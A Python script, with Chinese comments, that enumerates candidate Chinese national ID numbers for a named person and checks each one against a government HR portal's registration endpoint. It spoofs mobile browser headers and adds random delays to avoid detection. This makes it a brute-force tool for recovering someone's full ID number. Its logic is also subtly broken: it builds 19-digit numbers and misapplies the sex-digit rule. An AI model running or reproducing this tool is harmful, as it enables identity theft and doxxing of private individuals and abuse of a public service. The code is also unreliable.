import random
import requests
import asyncio
import aiohttp
import argparse
import sys


# 生成校验码函数（基于身份证校验规则）
def calculate_checksum(id_number):
    weights = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    checksum_list = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
    total = sum(int(id_number[i]) * weights[i] for i in range(17))
    return checksum_list[total % 11]


# 缓存已验证过的号码
verified_cache = {}


# 异步请求函数
async def verify_idcard(session, idcard, name):
    if idcard in verified_cache:
        print(f"身份证号码 {idcard} 已缓存结果: {verified_cache[idcard]}")
        return verified_cache[idcard]

    headers = {
        'Host': 'www.renshenet.org.cn',
        'Accept': 'application/json, text/plain, */*',
        'Sec-Fetch-Site': 'same-origin',
        'depCode': '0004',
        'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Sec-Fetch-Mode': 'cors',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://www.renshenet.org.cn',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Referer': 'https://www.renshenet.org.cn/jxzhrsdist/index.html',
        'Content-Length': '47',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty'
    }

    data = {
        "idcard": idcard,
        "name": name
    }

    try:
        async with session.post('https://www.renshenet.org.cn/mobile/person/register/checkidcard', headers=headers,
                                json=data) as response:
            result = await response.json()
            if result["data"]["isSucces"]:
                print(f"身份证号码 {idcard} ✅验证通过")
                verified_cache[idcard] = True
            else:
                print(f"身份证号码 {idcard} ❌验证未通过")
                verified_cache[idcard] = False
    except Exception as e:
        print(f"请求错误: {e}")
        verified_cache[idcard] = False


# 使用 argparse 模块处理命令行输入
parser = argparse.ArgumentParser(description="身份证生成和验证工具")
parser.add_argument('-ic', '--idcard_prefix', type=str, required=True, help="身份证号码前14位")
parser.add_argument('--name', '-n', type=str, required=True, help="姓名")
parser.add_argument('--sex', '-s', type=str, choices=["男", "女"], required=True, help="性别（男/女）")

# 如果没有提供参数，显示帮助信息
if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

# 根据性别生成身份证号码的第17位
if args.sex == "男":
    idcard_17th = str(random.randint(1, 9))
elif args.sex == "女":
    idcard_17th = str(random.randint(0, 8))
else:
    print("性别输入错误，请输入'男'或'女'")
    sys.exit(1)

idcard_suffixes = [str(random.randint(0, 999)).zfill(3) for _ in range(100)]

async def main_logic():
    async with aiohttp.ClientSession() as session:
        for suffix in idcard_suffixes:
            idcard_without_checksum = args.idcard_prefix + idcard_17th + suffix
            checksum = calculate_checksum(idcard_without_checksum)
            idcard = idcard_without_checksum + checksum

            # 设置请求频率限制，最多每秒处理3个请求
            await verify_idcard(session, idcard, args.name)

            # 加入随机延时，模拟用户行为
            delay = random.uniform(0.5, 2)  # 随机延时 0.5 到 2 秒之间
            print(f"等待 {delay:.2f} 秒...")
            await asyncio.sleep(delay)

# 运行异步逻辑
asyncio.run(main_logic())
